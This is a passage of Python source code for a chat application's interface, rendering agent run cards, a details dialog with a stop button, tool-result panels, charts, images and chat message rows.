            status_label = agent_member_status_label(status)
        except Exception:
            status_label = status.replace("_", " ").title()
        name = str(run_row.get("display_name") or run_id or "Agent").strip()
        profile = str(
            run_row.get("profile_display_name")
            or run_row.get("profile_slug")
            or run_row.get("kind")
            or "Agent"
        ).strip()
        thread_id = str(run_row.get("thread_id") or "").strip()
        summary = str(
            run_row.get("summary")
            or run_row.get("status_message")
            or run_row.get("error")
            or ""
        ).strip()
        events = get_agent_events(run_id, limit=24) if run_id else []
        parent_notes = get_agent_parent_messages(run_id, limit=6) if run_id else []
        child_messages: list[dict] = []
        if thread_id:
            try:
                child_messages = load_thread_messages(thread_id)[-6:]
            except Exception:
                logger.debug("Could not load child Agent messages for peek", exc_info=True)
        artifacts = _extract_agent_artifacts(summary)
        terminal = status.lower() in {
            "completed",
            "completed_delivery_failed",
            "failed",
            "blocked",
            "stopped",
            "cancelled",
            "timed_out",
        }
        workspace_details = _agent_workspace_details(run_row)

        with ui.dialog() as dlg, ui.card().classes("q-pa-md").style(
            "width: min(760px, 94vw); max-height: min(760px, 88vh); "
            "border-radius: 10px; border: 1px solid rgba(96, 165, 250, 0.28);"
        ):
            with ui.row().classes("w-full items-start no-wrap gap-2"):
                ui.icon("hub", size="20px").classes("text-primary q-mt-xs")
                with ui.column().classes("gap-0").style("flex: 1; min-width: 0;"):
                    with ui.row().classes("w-full items-center no-wrap gap-2"):
                        ui.badge(status_label, color=_agent_status_color(status)).props("outline dense")
                        ui.label(name).classes("text-sm font-bold ellipsis").style("flex: 1; min-width: 0;")
                        ui.label(profile).classes("text-xs text-grey-6 ellipsis").style("max-width: 160px;")
                        if workspace_details["mode"] == "worktree":
                            ui.badge("Worktree", color="blue-grey").props("outline dense").tooltip(
                                workspace_details["tooltip"]
                            )
                    if run_id:
                        ui.label(f"Run {run_id}").classes("text-xs text-grey-7 ellipsis")
                ui.button(icon="close", on_click=dlg.close).props("round flat dense").tooltip("Close")

            with ui.scroll_area().classes("w-full").style("max-height: 62vh;"):
                if summary:
                    ui.label("Summary").classes("text-xs font-bold text-grey-5 q-mt-sm")
                    ui.label(summary).classes("text-sm text-grey-3").style(
                        "white-space: pre-wrap; line-height: 1.4;"
                    )
                if artifacts:
                    ui.label("Artifacts").classes("text-xs font-bold text-grey-5 q-mt-sm")
                    with ui.column().classes("w-full gap-1"):
                        for artifact in artifacts:
                            with ui.row().classes("w-full items-center no-wrap gap-1"):
                                ui.icon("attach_file", size="xs").classes("text-grey-5")
                                ui.label(artifact).classes("text-xs ellipsis").style("flex: 1; min-width: 0;")
                if workspace_details["mode"] == "worktree":
                    ui.label("Worktree").classes("text-xs font-bold text-grey-5 q-mt-sm")
                    branch = workspace_details.get("branch") or "Worktree"
                    path = workspace_details.get("path") or ""
                    ui.label(branch).classes("text-xs text-grey-4")
                    if path:
                        ui.label(path).classes("text-xs text-grey-6 ellipsis")
                if parent_notes:
                    ui.label("Parent Notes").classes("text-xs font-bold text-grey-5 q-mt-sm")
                    for note in parent_notes[-4:]:
                        ui.label(_short_text(note, 180)).classes("text-xs text-amber-3").style(
                            "border-left: 2px solid rgba(251, 191, 36, 0.55); padding-left: 8px;"
                        )
                if events:
                    ui.label("Activity").classes("text-xs font-bold text-grey-5 q-mt-sm")
                    with ui.column().classes("w-full gap-1"):
                        for event in events[-12:]:
                            ui.label(_agent_event_slug(event)).classes("text-xs text-grey-5").style(
                                "border-left: 2px solid rgba(96, 165, 250, 0.35); padding-left: 8px;"
                            )
                if child_messages:
                    ui.label("Child Thread Snippets").classes("text-xs font-bold text-grey-5 q-mt-sm")
                    for child_msg in child_messages:
                        role = str(child_msg.get("role") or "message")
                        content = child_msg.get("content", "")
                        if isinstance(content, list):
                            content = " ".join(str(item) for item in content)
                        ui.label(f"{role}: {_short_text(content, 180)}").classes("text-xs text-grey-5").style(
                            "white-space: normal;"
                        )
            with ui.row().classes("w-full justify-between items-center q-mt-sm"):
                with ui.row().classes("gap-1"):
                    if thread_id and callable(on_open_agent_thread):
                        ui.button(
                            "Open thread",
                            icon="open_in_new",
                            on_click=lambda row=run_row: (dlg.close(), on_open_agent_thread(row)),
                        ).props("flat dense no-caps")
                    if workspace_details["mode"] == "worktree":
                        ui.button(
                            "Open worktree",
                            icon="folder_open",
                            on_click=lambda row=run_row: _open_agent_worktree(row),
                        ).props("flat dense no-caps")
                        ui.button(
                            "Compare",
                            icon="difference",
                            on_click=lambda row=run_row: _show_agent_worktree_compare(row),
                        ).props("flat dense no-caps")
                    if run_id:
                        def _copy_summary(rid=run_id, text=summary) -> None:
                            payload = text or rid
                            try:
                                ui.run_javascript(
                                    f"navigator.clipboard && navigator.clipboard.writeText({_json.dumps(payload)});"
                                )
                            except Exception:
                                logger.debug("Could not copy Agent summary", exc_info=True)
                            ui.notify("Agent summary copied.", type="info", close_button=True)

                        ui.button(icon="content_copy", on_click=_copy_summary).props(
                            "flat dense round size=sm"
                        ).tooltip("Copy summary")
                    if run_id and not terminal:
                        def _stop_agent(rid=run_id) -> None:
                            stopped = stop_agent_run(rid)
                            ui.notify(
                                "Agent stop requested." if stopped else "Agent Run not found.",
                                type="warning",
                                close_button=True,
                            )
                            dlg.close()

                        ui.button(icon="stop", on_click=_stop_agent).props(
                            "flat dense round size=sm color=orange"
                        ).tooltip("Stop Agent")
                ui.button("Close", on_click=dlg.close).props("flat dense no-caps")
        dlg.open()
    except Exception as exc:
        logger.debug("Agent peek dialog failed", exc_info=True)
        ui.notify(f"Could not open Agent details: {exc}", type="negative", close_button=True)


def _render_agent_run_card(
    run: dict,
    *,
    payload_message: str = "",
    on_use_agent_result: Callable[[str], None] | None = None,
    on_open_agent_thread: Callable[[dict], None] | None = None,
) -> None:
    run_id = str(run.get("id") or "").strip()
    status = str(run.get("status") or "unknown").strip()
    try:
        from row_bot.agent_orchestrator import agent_member_status_label

        status_label = agent_member_status_label(status)
    except Exception:
        status_label = status.replace("_", " ").title()
    name = str(run.get("display_name") or run_id or "Agent").strip()

    with ui.button(
        on_click=lambda row=run, rid=run_id: open_agent_peek_dialog(
            rid or row,
            on_open_agent_thread=on_open_agent_thread,
        ),
    ).props("flat dense no-caps no-ripple").classes("row-bot-agent-run-stud"):
        ui.icon("hub", size="17px").classes("text-primary").props('aria-hidden="true"')
        ui.label(name).classes("row-bot-agent-run-name text-sm font-semibold")
        ui.element("span").classes(
            f"row-bot-agent-run-status-dot bg-{_agent_status_color(status)}"
        ).props(f'role="img" aria-label="Agent status: {status_label}"')


def _current_agent_run_for_card(run: dict) -> dict:
    run_id = str(run.get("id") or "").strip()
    if not run_id:
        return run
    try:
        from row_bot.agent_runs import get_agent_run

        current = get_agent_run(run_id)
        if current:
            return current
    except Exception:
        logger.debug("Could not load current Agent Run %s for card", run_id, exc_info=True)
    return run


def _agent_run_is_terminal(run: dict) -> bool:
    return str((run or {}).get("status") or "").strip().lower() in {
        "completed",
        "completed_delivery_failed",
        "failed",
        "blocked",
        "stopped",
        "cancelled",
        "timed_out",
    }


def _agent_card_runs_from_tool_results(tool_results: list[dict]) -> tuple[list[tuple[dict, str]], list[dict]]:
    from row_bot.ui.tool_trace import (
        agent_runs_from_payload,
        parse_agent_tool_payload,
    )

    ordered_keys: list[str] = []
    runs_by_key: dict[str, tuple[dict, str]] = {}
    raw_results: list[dict] = []
    for idx, result in enumerate(tool_results):
        payload = parse_agent_tool_payload(result)
        runs = agent_runs_from_payload(payload)
        if not payload or not runs:
            continue
        raw_results.append(result)
        message = str(payload.get("message") or "").strip()
        for run_idx, run in enumerate(runs):
            run_id = str(run.get("id") or "").strip()
            key = run_id or f"payload-{idx}-{run_idx}"
            if key not in runs_by_key:
                ordered_keys.append(key)
            runs_by_key[key] = (run, message)
    return [runs_by_key[key] for key in ordered_keys], raw_results


def _render_raw_agent_tool_outputs(results: list[dict]) -> None:
    from row_bot.ui.tool_trace import display_tool_content

    with ui.expansion("Raw Agent tool output", icon="data_object").classes("w-full"):
        if len(results) == 1:
            display = display_tool_content(results[0].get("content", ""))
            if display:
                ui.code(display).classes("w-full text-xs")
            return
        for idx, result in enumerate(results, start=1):
            with ui.expansion(f"#{idx}", icon="subdirectory_arrow_right").classes("w-full"):
                display = display_tool_content(result.get("content", ""))
                if display:
                    ui.code(display).classes("w-full text-xs")


def render_agent_tool_results(
    results: list[dict],
    *,
    thread_id: str | None = None,
    on_use_agent_result: Callable[[str], None] | None = None,
    on_open_agent_thread: Callable[[dict], None] | None = None,
) -> bool:
    """Render Agent tool results as one durable card per Agent Run id."""

    del thread_id
    card_runs, raw_results = _agent_card_runs_from_tool_results(results)
    if not card_runs:
        return False

    def _current_runs() -> list[tuple[dict, str]]:
        return [(_current_agent_run_for_card(run), message) for run, message in card_runs]

    with ui.column().classes("w-full gap-2") as card_container:
        pass

    def _render_cards() -> list[tuple[dict, str]]:
        current_runs = _current_runs()
        try:
            card_container.clear()
            with card_container:
                with ui.row().classes("row-bot-agent-run-list w-full items-center flex-wrap gap-1"):
                    for run, message in current_runs:
                        _render_agent_run_card(
                            run,
                            payload_message=message,
                            on_use_agent_result=on_use_agent_result,
                            on_open_agent_thread=on_open_agent_thread,
                        )
                _render_raw_agent_tool_outputs(raw_results)
        except Exception:
            logger.debug("Agent tool-result card render failed", exc_info=True)
        return current_runs

    current_runs = _render_cards()
    if any(not _agent_run_is_terminal(run) for run, _message in current_runs):
        attempts = {"count": 0}
        timer_ref: dict[str, object | None] = {"timer": None}

        def _tick() -> None:
            attempts["count"] += 1
            refreshed = _render_cards()
            if (
                all(_agent_run_is_terminal(run) for run, _message in refreshed)
                or attempts["count"] >= 240
            ):
                timer_obj = timer_ref.get("timer")
                if timer_obj is not None:
                    try:
                        timer_obj.deactivate()  # type: ignore[attr-defined]
                    except Exception:
                        logger.debug("Agent tool-result card self-refresh deactivate failed", exc_info=True)

        try:
            from row_bot.ui.timer_utils import safe_timer

            timer_ref["timer"] = safe_timer(1.0, _tick)
        except Exception:
            logger.debug("Agent tool-result card self-refresh scheduling failed", exc_info=True)
    return True


def render_agent_run_cards(
    run_ids: list[str],
    *,
    on_use_agent_result: Callable[[str], None] | None = None,
    on_open_agent_thread: Callable[[dict], None] | None = None,
) -> bool:
    """Render durable Agent Run cards directly from run ids."""

    clean_ids = [str(run_id).strip() for run_id in run_ids if str(run_id or "").strip()]
    if not clean_ids:
        return False

    def _current_runs() -> list[dict]:
        try:
            from row_bot.agent_runs import get_agent_run

            return [run for run_id in clean_ids if (run := get_agent_run(run_id))]
        except Exception:
            logger.debug("Could not load Agent Runs for direct cards", exc_info=True)
            return []

    with ui.column().classes("w-full gap-2") as card_container:
        pass

    def _render_cards() -> list[dict]:
        current_runs = _current_runs()
        try:
            card_container.clear()
            with card_container:
                with ui.row().classes("row-bot-agent-run-list w-full items-center flex-wrap gap-1"):
                    for run in current_runs:
                        _render_agent_run_card(
                            run,
                            on_use_agent_result=on_use_agent_result,
                            on_open_agent_thread=on_open_agent_thread,
                        )
        except Exception:
            logger.debug("Direct Agent Run card render failed", exc_info=True)
        return current_runs

    current_runs = _render_cards()
    if current_runs and any(not _agent_run_is_terminal(run) for run in current_runs):
        attempts = {"count": 0}
        timer_ref: dict[str, object | None] = {"timer": None}

        def _tick() -> None:
            attempts["count"] += 1
            refreshed = _render_cards()
            if (
                all(_agent_run_is_terminal(run) for run in refreshed)
                or attempts["count"] >= 240
            ):
                timer_obj = timer_ref.get("timer")
                if timer_obj is not None:
                    try:
                        timer_obj.deactivate()  # type: ignore[attr-defined]
                    except Exception:
                        logger.debug("Direct Agent Run card refresh deactivate failed", exc_info=True)

        try:
            from row_bot.ui.timer_utils import safe_timer

            timer_ref["timer"] = safe_timer(1.0, _tick)
        except Exception:
            logger.debug("Direct Agent Run card refresh scheduling failed", exc_info=True)
    return bool(current_runs)


def render_agent_tool_result(
    result: dict,
    *,
    thread_id: str | None = None,
    on_use_agent_result: Callable[[str], None] | None = None,
    on_open_agent_thread: Callable[[dict], None] | None = None,
) -> bool:
    return render_agent_tool_results(
        [result],
        thread_id=thread_id,
        on_use_agent_result=on_use_agent_result,
        on_open_agent_thread=on_open_agent_thread,
    )


def render_message_content(
    msg: dict,
    thread_id: str | None = None,
    *,
    on_use_agent_result: Callable[[str], None] | None = None,
    on_open_agent_thread: Callable[[dict], None] | None = None,
) -> None:
    """Render a single message's content inside the current parent element."""
    from row_bot.ui.tool_trace import (
        display_tool_content,
        group_tool_results,
        is_agent_tool_result,
        tool_result_failed,
        tool_group_status,
    )

    role = msg.get("role", "assistant")
    lifecycle_text_rendered = False
    approval_text_rendered = False

    if role == "assistant":
        for notice in msg.get("warnings") or []:
            if not isinstance(notice, dict):
                continue
            with ui.card().classes(
                "w-full bg-amber-1 text-amber-10 border border-amber-4 q-pa-sm"
            ):
                ui.label(str(notice.get("title") or "Memory recall fallback")).classes(
                    "text-sm font-semibold"
                )
                ui.label(str(notice.get("message") or "")).classes("text-xs")
                ui.label(f"Reason: {notice.get('detail') or ''}").classes("text-xs")
                ui.label(f"Next: {notice.get('action') or ''}").classes("text-xs font-medium")

    queued = msg.get("queued_control") if role == "user" else None
    if isinstance(queued, dict):
        status = str(queued.get("status") or "queued")
        label = str(queued.get("label") or "Queued").strip() or "Queued"
        color = {
            "queued_parent_turn": "amber-3",
            "dispatching": "blue-3",
            "queued_agent_message": "amber-3",
            "running_agent_message": "blue-3",
            "recorded_agent_message": "blue-3",
        }.get(status, "grey-4")
        with ui.row().classes("items-center gap-1").style(
            "font-size: 0.72rem; opacity: 0.82;"
        ):
            ui.icon("schedule", size="14px").classes(f"text-{color}")
            ui.label(label).classes("text-grey-5")

    # Thinking / reasoning (collapsed by default)
    thinking = msg.get("thinking")
    if thinking and role == "assistant":
        with ui.expansion(
            "\U0001f4ad Thinking", icon="psychology"
        ).classes("w-full"):
            ui.code(thinking.strip()[:8_000]).classes("w-full text-xs")

    if role == "assistant" and isinstance(msg.get("agent_lifecycle"), dict):
        lifecycle_text = msg.get("content", "")
        if isinstance(lifecycle_text, list):
            lifecycle_text = " ".join(str(t) for t in lifecycle_text)
        if not isinstance(lifecycle_text, str):
            lifecycle_text = str(lifecycle_text) if lifecycle_text else ""
        if lifecycle_text:
            render_text_with_embeds(lifecycle_text)
            lifecycle_text_rendered = True

    if role == "assistant" and msg.get("approval_request_id"):
        approval = _load_pending_approval(approval_id=str(msg.get("approval_request_id") or ""))
        _render_approval_request_card(
            approval,
            fallback_message=str(msg.get("content") or "This approval is no longer pending."),
        )
        approval_text_rendered = True

    # Direct Agent runs started by the chat UI store durable run ids before
    # any Agent tool result exists. Render those as the same first-class card.
    agent_run_ids = msg.get("agent_run_ids") if role == "assistant" else None
    if isinstance(agent_run_ids, list) and agent_run_ids and not msg.get("approval_request_id"):
        try:
            from row_bot.agent_runs import get_agent_run

            with ui.row().classes("row-bot-agent-run-list w-full items-center flex-wrap gap-1"):
                for run_id in agent_run_ids:
                    run = get_agent_run(str(run_id))
                    if run:
                        _render_agent_run_card(
                            run,
                            on_use_agent_result=on_use_agent_result,
                            on_open_agent_thread=on_open_agent_thread,
                        )
                    else:
                        ui.label(f"Agent Run not found: {run_id}").classes("text-xs text-grey-6")
        except Exception:
            logger.debug("Direct Agent Run card rendering failed", exc_info=True)

    # Tool results
    tool_results = msg.get("tool_results")
    tool_results_for_media = tool_results
    if tool_results:
        agent_tool_results: list[dict] = []
        generic_tool_results: list[dict] = []
        for tr in tool_results:
            if isinstance(tr, dict) and is_agent_tool_result(tr):
                agent_tool_results.append(tr)
            elif isinstance(tr, dict):
                generic_tool_results.append(tr)
        if agent_tool_results:
            render_agent_tool_results(
                agent_tool_results,
                thread_id=thread_id,
                on_use_agent_result=on_use_agent_result,
                on_open_agent_thread=on_open_agent_thread,
            )
        for group in group_tool_results(generic_tool_results):
            group_status, group_icon = tool_group_status(group.results)
            with ui.expansion(
                f"{'⚠️' if group_icon == 'warning' else '✅'} {group_status} {group.label}",
                icon=group_icon,
            ).classes("w-full").props("data-docs-id=tool-trace"):
                for idx, tr in enumerate(group.results, start=1):
                    item_failed = tool_result_failed(tr)
                    title = (
                        f"#{idx} failed"
                        if item_failed and group.count > 1
                        else f"#{idx}"
                        if group.count > 1
                        else group.name
                    )
                    with ui.expansion(
                        title,
                        icon="error" if item_failed else "subdirectory_arrow_right",
                    ).classes("w-full"):
                        content = tr.get("content", "")
                        if isinstance(content, str) and content.startswith("__CHART__:"):
                            _me = content.find("\n\n", 10)
                            _fj = content[10:] if _me == -1 else content[10:_me]
                            _dt = "Chart created" if _me == -1 else content[_me + 2:]
                            try:
                                import plotly.io as _pio
                                fig = _pio.from_json(_fj)
                                ui.plotly(fig).classes("w-full")
                            except Exception:
                                logger.debug("Chart rendering failed in tool result", exc_info=True)
                            content = _dt
                        if isinstance(content, str) and content.startswith("__IMAGE__:"):
                            _me = content.find("\n\n", 10)
                            _ib = content[10:] if _me == -1 else content[10:_me]
                            _dt = "Image generated" if _me == -1 else content[_me + 2:]
                            try:
                                render_image_with_save(_ib)
                            except Exception:
                                logger.debug("Image rendering failed in tool result", exc_info=True)
                            content = _dt
                        if isinstance(content, str) and content.startswith("__HTML__:"):
                            _me = content.find("\n\n", 9)
                            _hc = content[9:] if _me == -1 else content[9:_me]
                            _dt = "" if _me == -1 else content[_me + 2:]
                            try:
                                ui.html(_hc).classes("w-full")
                            except Exception:
                                logger.debug("HTML widget rendering failed in tool result", exc_info=True)
                            content = _dt
                        display = display_tool_content(content)
                        if display:
                            ui.code(display).classes("w-full text-xs")
    tool_results = tool_results_for_media

    # Images (live) or placeholder (reloaded thread)
    images = msg.get("images")
    if images:
        caption = "📎 Attached" if role == "user" else "📷 Captured"
        for img_entry in images:
            render_image_with_save(img_entry, thread_id=thread_id)
            ui.label(caption).classes("text-xs text-grey-6")

    # Videos (generated clips)
    videos = msg.get("videos")
    if videos:
        for vid_entry in videos:
            if isinstance(vid_entry, dict):
                fname = vid_entry.get("filename") or vid_entry.get("path", "")
            else:
                fname = str(vid_entry)
            render_video_with_save(fname, thread_id=thread_id)
            ui.label("🎬 Generated video").classes("text-xs text-grey-6")

    if not images and tool_results and any(
        tr.get("name") in ("analyze_image", "👁️ Vision") for tr in tool_results
    ):
        with ui.row().classes("items-center gap-2").style(
            "padding: 0.5rem 0.75rem; border-radius: 8px; "
            "background: rgba(255,255,255,0.04);"
        ):
            ui.icon("image", size="sm").style("color: #888;")
            ui.label("Image not available — captures are transient to save space").style(
                "font-size: 0.8rem; color: #888; font-style: italic;"
            )

    # Charts (Plotly)
    charts = msg.get("charts")
    if charts:
        try:
            import plotly.io as _pio
            for fig_json in charts:
                fig = _pio.from_json(fig_json)
                ui.plotly(fig).classes("w-full")
        except Exception:
            logger.debug("Chart rendering failed", exc_info=True)

    # Main text with inline YouTube embeds
    text = msg.get("content", "")
    if isinstance(text, list):
        text = " ".join(str(t) for t in text)
    if not isinstance(text, str):
        text = str(text) if text else ""
    if text and not lifecycle_text_rendered and not approval_text_rendered:
        render_text_with_embeds(text)

    # Trigger highlight.js on new code blocks + render mermaid diagrams
    try:
        ui.run_javascript(
            "if (window.rowBotHighlightCodeBlocks) { window.rowBotHighlightCodeBlocks(); } "
            "else { setTimeout(function() { document.querySelectorAll('pre code:not([data-highlighted=\"yes\"])').forEach(function(el) { if (!el.closest('.row-bot-live-stream') && !el.children.length) hljs.highlightElement(el); }); }, 80); }"
        )
        ui.run_javascript(
            "document.querySelectorAll('pre code.language-mermaid').forEach(function(el) {"
            "  var pre = el.parentElement;"
            "  var div = document.createElement('div');"
            "  div.className = 'mermaid-rendered';"
            "  div.textContent = el.textContent;"
            "  pre.replaceWith(div);"
            "});"
            "var nodes = Array.from(document.querySelectorAll('pre.mermaid')).filter(function(node) { return !node.closest('.row-bot-live-stream'); });"
            "mermaid.run({nodes: nodes, suppressErrors: true});"
        )
    except RuntimeError:
        logger.debug("JS runtime unavailable for hljs/mermaid", exc_info=True)


def add_chat_message(
    msg: dict,
    p: P,
    thread_id: str | None = None,
    *,
    on_use_agent_result: Callable[[str], None] | None = None,
    on_open_agent_thread: Callable[[dict], None] | None = None,
) -> None:
    """Append a rendered chat message to the chat container."""
    if p.chat_container is None:
        return
    is_user = msg["role"] == "user"
    avatar_cls = "row-bot-avatar row-bot-avatar-user" if is_user else "row-bot-avatar row-bot-avatar-bot"
    if is_user:
        avatar_content = "👤"
        name = "You"
    else:
        from row_bot.identity import get_assistant_name
        from row_bot.ui.status_bar import get_bot_avatar_html
        avatar_content = get_bot_avatar_html()
        name = get_assistant_name()
    stamp = msg.get("timestamp", datetime.now().strftime("%H:%M"))
    with p.chat_container:
        row_cls = "row-bot-msg-row row-bot-msg-row-user" if is_user else "row-bot-msg-row"
        with ui.element("div").classes(row_cls):
            ui.html(f'<div class="{avatar_cls}">{avatar_content}</div>', sanitize=False)
            with ui.column().classes("row-bot-msg-body gap-1"):
                ui.html(
                    f'<div class="row-bot-msg-header">'
                    f'<span class="row-bot-msg-name">{name}</span>'
                    f'<span class="row-bot-msg-stamp">{stamp}</span>'
                    f'</div>',
                    sanitize=False,
                )
                render_message_content(
                    msg,
                    thread_id=thread_id,
                    on_use_agent_result=on_use_agent_result,
                    on_open_agent_thread=on_open_agent_thread,
                )
